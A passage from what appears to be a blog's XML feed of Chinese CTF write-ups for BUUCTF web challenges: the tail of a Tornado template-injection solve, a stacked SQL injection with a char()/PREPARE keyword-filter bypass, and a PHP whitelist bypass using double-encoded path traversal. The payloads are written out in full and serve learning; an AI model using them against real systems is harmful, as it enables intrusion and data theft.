<p>error改成：<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;  <span class="keyword">handler</span>.settings获取环境变量</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/BUUCTF/tornado/1.png" alt="avatar"></p>
<p>成功得到了cookie_secret<br>接下来就只需解决md5的问题了</p>
<p>然后，尴尬的问题又来了，不会写脚本 哭了，还是python的<br>所以说，开发和安全缺一不可，只好去找大佬的脚本<br><img src="/img/BUUCTF/tornado/2.png" alt="avatar"></p>
<p>构造payload:<br><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">file</span>?<span class="meta">filename</span>=/fllllllllllllag<span class="variable">&amp;&amp;filehash</span>=97a05accf0b1378842a54ec11b3074cb</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<p>学到了学到了 看完脚本之后，我觉得还是很简单的，就是没学python不懂语法，待我去肝一肝python</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-随便注 1</title>
    <url>/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
    <content><![CDATA[<h1 id="随便注-1"><a href="#随便注-1" class="headerlink" title="随便注 1"></a>随便注 1</h1><p>之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了</p>
<p>先随便点击一下提交<br><img src="/img/BUUCTF/随便注1/0.png" alt="avatar"></p>
<p>看得出是一个sql注入类型的题目<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">' 出现报错，验证存在注入</span></span><br><span class="line"><span class="string">1’# 没有报错</span></span><br><span class="line"><span class="string">1'</span> order by <span class="number">1</span><span class="comment"># 没有报错</span></span><br><span class="line"><span class="number">1</span><span class="string">' order by 3# 出现报错，证明字段有2个</span></span><br><span class="line"><span class="string">1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2<span class="comment">#   return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 过滤掉了很多关键字</span></span></span><br></pre></td></tr></table></figure><br>当时就卡在这里，现在想想还是很亏没有考虑的很多，赛后看了大佬们的WP才知道思路：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment"># 成功，说明存在堆叠注入</span></span><br></pre></td></tr></table></figure><br>堆叠注入可以参考一下：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>我的理解下来，加上学完了数据库原理，大概意思就是;在数据库中代表一条语句的结束，系统识别到;时，前面的代码在系统中就被视为已经结束，所以可以利用;来进行堆叠注入<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment"># 得到表名1919810931114514</span></span><br></pre></td></tr></table></figure><br>这里用到了Mysql的预处理语句，可以参考这里：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
<p>感觉有点像数据库安全那里，创建角色，然后把权限赋值给该角色，再通过该角色依次赋予权限，主要是为了省事。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> <span class="string">'[my sql sequece]'</span>; 预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行预定义<span class="keyword">sql</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>也可以通过变量传输<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn=<span class="string">'hahaha'</span>; 存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'select * from '</span>,@tn); 存储sql语句</span><br><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> @<span class="keyword">sql</span>; 预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行SQL预定义语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure></p>
<p>构造payload<br>这里可以用char()方法将ASCII码转换为select字符串，再利用concat()拼接<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">11';<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">" * from `1919810931114514`"</span>);<span class="keyword">PREPARE</span> sqla <span class="keyword">from</span> @<span class="keyword">sql</span>;EXECUTEsqla;<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WarmUP</title>
    <url>/2020/01/18/BUUCTF-WarmUP/</url>
    <content><![CDATA[<h1 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h1><p>首先启动环境，发现滑稽图；没有什么好说的crtl+u查看源码：<br><img src="/img/BUUCTF/WarmUp/0.png" alt="avatar"></p>
<p>得到提示：source.php</p>
<p>通过URL访问一下 得到源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>得知是PHP代码审计题</p>
<p>通过代码审计可以得到还有一个hint.php  访问得到：<br>flag not here, and flag in ffffllllaaaagggg</p>
<p>所以考虑最后的payload需要用到ffffllllaaaagggg</p>
<p>并且得到参数名称为file<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><br> 关键代码，得知file变量不能为空，必须是字符串，还必须通过checkFile的检查<br> 经过查询函数：mb_strpos和mb_substr 的意思是截取变量page中？前面的字符串进行白名单校验<br> 所以source.php和hint.php均在白名单内，随意取一个构造payload:<br><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br>发现无法通过，是因为进行了三次检查，所以考虑URL编码问题，把?进行URL编码(注意使用英文?)<br>进行三次编码后?变为：%253F<br>构造payload：<br><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php%<span class="number">253</span>F<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
